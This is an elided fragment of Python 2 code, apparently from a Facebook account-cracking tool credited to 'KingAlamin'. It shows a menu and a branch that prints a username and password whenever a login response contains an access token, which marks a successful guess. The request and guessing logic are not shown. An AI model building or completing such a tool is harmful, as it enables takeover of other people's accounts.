...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : KingAlamin'
    print 'FACEBOOK : facebook.com/alamin.official16'
    print 'GITHUB     : github.com/KingAlamin'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[KingAlamin-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
